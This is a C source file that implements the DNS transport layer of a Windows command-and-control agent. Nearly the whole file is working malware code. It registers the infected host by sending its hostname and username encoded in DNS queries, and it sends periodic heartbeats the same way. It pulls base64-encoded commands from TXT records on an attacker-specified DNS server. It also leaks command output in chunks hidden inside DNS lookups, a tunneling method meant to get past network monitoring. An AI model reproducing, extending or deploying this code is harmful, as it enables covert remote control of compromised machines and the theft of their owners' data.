/**
 * Transport.c - DNS transport for C2 Agent
 * 
 * Implements DNS communication for the C2 agent using Windows DNS API.
 * Handles command requests and result transmission over DNS TXT records.
 */

 #include <windows.h>
 #include <windns.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include "../include/Transport.h"
 #include "../include/Utils.h"
 #include "../include/Config.h"

#pragma comment(lib, "dnsapi.lib")

// Maximum size for DNS chunks (DNS labels are limited to 63 characters)
#define MAX_DNS_CHUNK_SIZE 30

// Maximum retries for DNS queries
#define MAX_DNS_RETRIES 3

// Delay between retries (in milliseconds)
#define DNS_RETRY_DELAY 1000

// Delay between chunks (in milliseconds)
#define DNS_CHUNK_DELAY 500

/**
 * Initialize the DNS transport module
 * 
 * @return TRUE if successful, FALSE otherwise
 */
BOOL dns_transport_init() {
    // Initialize Winsock (required for DNS functions)
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return FALSE;
    }
    
    return TRUE;
}

/**
 * Clean up the DNS transport module
 */
void dns_transport_cleanup() {
    // Clean up Winsock
    WSACleanup();
}

/**
 * Perform a DNS TXT query
 * 
 * @param query The DNS query string
 * @return The TXT record data (must be freed by caller), or NULL on error
 */
static char* dns_txt_query(const char* query) {
    PDNS_RECORD dnsRecord = NULL;
    char* result = NULL;
    
    printf("[DEBUG] Performing DNS TXT query: %s\n", query);
    
    // Retry mechanism for DNS queries
    for (int retry = 0; retry < MAX_DNS_RETRIES; retry++) {
        printf("[DEBUG] DNS query attempt %d/%d\n", retry + 1, MAX_DNS_RETRIES);
        
        DNS_STATUS status = DnsQuery_A(
            query,                 // Domain name to query
            DNS_TYPE_TEXT,         // Type of record to query (TXT)
            DNS_QUERY_STANDARD,    // Standard query
            NULL,                  // No extra DNS servers
            &dnsRecord,            // Result
            NULL                   // Reserved for future use
        );
        
        printf("[DEBUG] DNS query status: %lu\n", status);
        
        if (status == ERROR_SUCCESS && dnsRecord && dnsRecord->wType == DNS_TYPE_TEXT) {
            // Get the TXT record data
            if (dnsRecord->Data.TXT.dwStringCount > 0) {
                DWORD dataLength = strlen(dnsRecord->Data.TXT.pStringArray[0]);
                result = (char*)malloc(dataLength + 1);
                
                if (result) {
                    strcpy_s(result, dataLength + 1, dnsRecord->Data.TXT.pStringArray[0]);
                    printf("[DEBUG] DNS query successful, received data: %s\n", result);
                }
            }
            
            DnsRecordListFree(dnsRecord, DnsFreeRecordList);
            break;
        }
        
        // If we have a record but no result, free it
        if (dnsRecord) {
            DnsRecordListFree(dnsRecord, DnsFreeRecordList);
            dnsRecord = NULL;
        }
        
        // If this isn't the last retry, wait before trying again
        if (retry < MAX_DNS_RETRIES - 1) {
            printf("[DEBUG] Retrying DNS query in %d ms\n", DNS_RETRY_DELAY);
            Sleep(DNS_RETRY_DELAY);
        }
    }
    
    if (result == NULL) {
        printf("[DEBUG] DNS query failed, no result\n");
    }
    
    return result;
}

/**
 * Perform a DNS TXT query with explicit server
 * 
 * @param query The DNS query string
 * @param server_ip The DNS server IP address
 * @return The TXT record data (must be freed by caller), or NULL on error
 */
static char* dns_txt_query_with_server(const char* query, const char* server_ip) {
    PDNS_RECORD dnsRecord = NULL;
    char* result = NULL;
    
    printf("[DEBUG] Performing DNS TXT query: %s (Server: %s)\n", query, server_ip);
    
    // Set up the DNS server IP
    IP4_ARRAY dnsServers;
    dnsServers.AddrCount = 1;
    dnsServers.AddrArray[0] = inet_addr(server_ip);
    
    // Retry mechanism for DNS queries
    for (int retry = 0; retry < MAX_DNS_RETRIES; retry++) {
        printf("[DEBUG] DNS query attempt %d/%d\n", retry + 1, MAX_DNS_RETRIES);
        
        DNS_STATUS status = DnsQuery_A(
            query,                 // Domain name to query
            DNS_TYPE_TEXT,         // Type of record to query (TXT)
            DNS_QUERY_BYPASS_CACHE,// Bypass cache
            &dnsServers,           // Use specific DNS servers
            &dnsRecord,            // Result
            NULL                   // Reserved for future use
        );
        
        printf("[DEBUG] DNS query status: %lu\n", status);
        
        if (status == ERROR_SUCCESS && dnsRecord && dnsRecord->wType == DNS_TYPE_TEXT) {
            // Get the TXT record data
            if (dnsRecord->Data.TXT.dwStringCount > 0) {
                DWORD dataLength = strlen(dnsRecord->Data.TXT.pStringArray[0]);
                result = (char*)malloc(dataLength + 1);
                
                if (result) {
                    strcpy_s(result, dataLength + 1, dnsRecord->Data.TXT.pStringArray[0]);
                    printf("[DEBUG] DNS query successful, received data: %s\n", result);
                }
            }
            
            DnsRecordListFree(dnsRecord, DnsFreeRecordList);
            break;
        }
        
        // If we have a record but no result, free it
        if (dnsRecord) {
            DnsRecordListFree(dnsRecord, DnsFreeRecordList);
            dnsRecord = NULL;
        }
        
        // If this isn't the last retry, wait before trying again
        if (retry < MAX_DNS_RETRIES - 1) {
            printf("[DEBUG] Retrying DNS query in %d ms\n", DNS_RETRY_DELAY);
            Sleep(DNS_RETRY_DELAY);
        }
    }
    
    if (result == NULL) {
        printf("[DEBUG] DNS query failed, no result\n");
    }
    
    return result;
}

/**
 * Request a command from the C2 server
 * 
 * @param agent_id The agent ID
 * @param domain The C2 domain
 * @return The command (must be freed by caller), or NULL if no command
 */
char* dns_request_command(const char* agent_id, const char* domain) {
    // Format the query string
    char query[256];
    sprintf_s(query, sizeof(query), "cmd.%s.%s", agent_id, domain);
    
    // Get the C2 domain (which is actually the server IP in our case)
    const char* server_ip = domain;
    
    // Perform the DNS TXT query with explicit server
    char* encoded_command = dns_txt_query_with_server(query, server_ip);
    if (encoded_command == NULL) {
        return NULL;
    }
    
    // Decode the base64 command
    size_t decoded_size;
    unsigned char* decoded_command = base64_decode(encoded_command, strlen(encoded_command), &decoded_size);
    free(encoded_command);
    
    if (decoded_command == NULL) {
        return NULL;
    }
    
    // Ensure the command is null-terminated
    char* command = (char*)malloc(decoded_size + 1);
    if (command == NULL) {
        free(decoded_command);
        return NULL;
    }
    
    memcpy(command, decoded_command, decoded_size);
    command[decoded_size] = '\0';
    free(decoded_command);
    
    return command;
}

/**
 * Send command execution results back to the C2 server
 * 
 * @param agent_id The agent ID
 * @param result_id The result ID
 * @param result The command execution result
 * @param domain The C2 domain
 * @return TRUE if successful, FALSE otherwise
 */
BOOL dns_send_result(const char* agent_id, const char* result_id, const char* result, const char* domain) {
    if (result == NULL) {
        return FALSE;
    }
    
    // Get the C2 domain (which is actually the server IP in our case)
    const char* server_ip = domain;
    
    // Calculate the number of chunks needed
    size_t result_len = strlen(result);
    int num_chunks = (result_len + MAX_DNS_CHUNK_SIZE - 1) / MAX_DNS_CHUNK_SIZE;
    
    printf("[DEBUG] Sending result in %d chunks\n", num_chunks);
    
    // Send each chunk
    for (int i = 0; i < num_chunks; i++) {
        // Extract the chunk
        size_t chunk_size = (i == num_chunks - 1) ? 
                          (result_len - i * MAX_DNS_CHUNK_SIZE) : 
                          MAX_DNS_CHUNK_SIZE;
        
        char chunk[MAX_DNS_CHUNK_SIZE + 1];
        memcpy(chunk, result + (i * MAX_DNS_CHUNK_SIZE), chunk_size);
        chunk[chunk_size] = '\0';
        
        // Encode the chunk
        size_t encoded_size;
        char* encoded_chunk = base64_encode((unsigned char*)chunk, chunk_size, &encoded_size);
        if (encoded_chunk == NULL) {
            return FALSE;
        }
        
        // Format the query string
        char query[256];
        sprintf_s(query, sizeof(query), "result.%s.%s.%s.%s", 
                 agent_id, result_id, encoded_chunk, domain);
        
        printf("[DEBUG] Sending chunk %d/%d: %s\n", i + 1, num_chunks, encoded_chunk);
        
        // Perform the DNS TXT query with explicit server
        char* response = dns_txt_query_with_server(query, server_ip);
        free(encoded_chunk);
        
        // Check for acknowledgment
        BOOL acknowledged = FALSE;
        if (response != NULL) {
            if (strcmp(response, "ACK") == 0) {
                acknowledged = TRUE;
                printf("[DEBUG] Chunk acknowledged\n");
            }
            free(response);
        }
        
        if (!acknowledged) {
            printf("[DEBUG] Chunk not acknowledged\n");
            return FALSE;
        }
        
        // Small delay between chunks
        if (i < num_chunks - 1) {
            Sleep(DNS_CHUNK_DELAY);
        }
    }
    
    return TRUE;
}

/**
 * Check if the C2 server is reachable
 * 
 * @param domain The C2 domain
 * @return TRUE if reachable, FALSE otherwise
 */
BOOL dns_check_server(const char* domain) {
    // Format the query string for a simple check
    char query[256];
    sprintf_s(query, sizeof(query), "cmd.test-agent.%s", domain);
    
    // Get the C2 domain (which is actually the server IP in our case)
    const char* server_ip = domain;
    
    // Perform the DNS TXT query with explicit server
    char* response = dns_txt_query_with_server(query, server_ip);
    BOOL reachable = (response != NULL);
    
    if (response) {
        free(response);
    }
    
    return reachable;
}

/**
 * Send a heartbeat to the C2 server
 * 
 * @param agent_id The agent ID
 * @param domain The C2 domain
 * @return TRUE if successful, FALSE otherwise
 */
BOOL dns_send_heartbeat(const char* agent_id, const char* domain) {
    // Get system information for the heartbeat
    char* hostname = get_hostname();
    char* username = get_username();
    char* timestamp = get_timestamp();
    
    if (!hostname || !username || !timestamp) {
        if (hostname) free(hostname);
        if (username) free(username);
        if (timestamp) free(timestamp);
        return FALSE;
    }
    
    // Format the heartbeat data
    char heartbeat_data[256];
    sprintf_s(heartbeat_data, sizeof(heartbeat_data), 
             "host=%s;user=%s;time=%s", hostname, username, timestamp);
    
    free(hostname);
    free(username);
    free(timestamp);
    
    // Encode the heartbeat data
    size_t encoded_size;
    char* encoded_data = base64_encode((unsigned char*)heartbeat_data, 
                                      strlen(heartbeat_data), &encoded_size);
    if (encoded_data == NULL) {
        return FALSE;
    }
    
    // Format the query string
    char query[256];
    sprintf_s(query, sizeof(query), "heartbeat.%s.%s.%s", 
             agent_id, encoded_data, domain);
    
    // Perform the DNS TXT query
    char* response = dns_txt_query(query);
    free(encoded_data);
    
    // Check for acknowledgment
    BOOL acknowledged = FALSE;
    if (response != NULL) {
        if (strcmp(response, "ACK") == 0) {
            acknowledged = TRUE;
        }
        free(response);
    }
    
    return acknowledged;
}

/**
 * Register the agent with the C2 server
 * 
 * @param domain The C2 domain
 * @return The assigned agent ID (must be freed by caller), or NULL on error
 */
char* dns_register_agent(const char* domain) {
    // Get system information for registration
    char* hostname = get_hostname();
    char* username = get_username();
    
    if (!hostname || !username) {
        if (hostname) free(hostname);
        if (username) free(username);
        return NULL;
    }
    
    // Format the registration data
    char reg_data[256];
    sprintf_s(reg_data, sizeof(reg_data), "host=%s;user=%s", hostname, username);
    
    free(hostname);
    free(username);
    
    // Encode the registration data
    size_t encoded_size;
    char* encoded_data = base64_encode((unsigned char*)reg_data, 
                                      strlen(reg_data), &encoded_size);
    if (encoded_data == NULL) {
        return NULL;
    }
    
    // Format the query string
    char query[256];
    sprintf_s(query, sizeof(query), "register.%s.%s", encoded_data, domain);
    
    // Perform the DNS TXT query
    char* response = dns_txt_query(query);
    free(encoded_data);
    
    if (response == NULL) {
        return NULL;
    }
    
    // The response should be the assigned agent ID
    return response;
}

/**
 * Unregister the agent from the C2 server
 * 
 * @param agent_id The agent ID
 * @param domain The C2 domain
 * @return TRUE if successful, FALSE otherwise
 */
BOOL dns_unregister_agent(const char* agent_id, const char* domain) {
    // Format the query string
    char query[256];
    sprintf_s(query, sizeof(query), "unregister.%s.%s", agent_id, domain);
    
    // Perform the DNS TXT query
    char* response = dns_txt_query(query);
    
    // Check for acknowledgment
    BOOL acknowledged = FALSE;
    if (response != NULL) {
        if (strcmp(response, "ACK") == 0) {
            acknowledged = TRUE;
        }
        free(response);
    }
    
    return acknowledged;
}

/**
 * Get the C2 server configuration
 * 
 * @param agent_id The agent ID
 * @param domain The C2 domain
 * @return The configuration (must be freed by caller), or NULL on error
 */
char* dns_get_config(const char* agent_id, const char* domain) {
    // Format the query string
    char query[256];
    sprintf_s(query, sizeof(query), "config.%s.%s", agent_id, domain);
    
    // Perform the DNS TXT query
    char* encoded_config = dns_txt_query(query);
    if (encoded_config == NULL) {
        return NULL;
    }
    
    // Decode the base64 config
    size_t decoded_size;
    unsigned char* decoded_config = base64_decode(encoded_config, 
                                                strlen(encoded_config), 
                                                &decoded_size);
    free(encoded_config);
    
    if (decoded_config == NULL) {
        return NULL;
    }
    
    // Ensure the config is null-terminated
    char* config = (char*)malloc(decoded_size + 1);
    if (config == NULL) {
        free(decoded_config);
        return NULL;
    }
    
    memcpy(config, decoded_config, decoded_size);
    config[decoded_size] = '\0';
    free(decoded_config);
    
    return config;
}
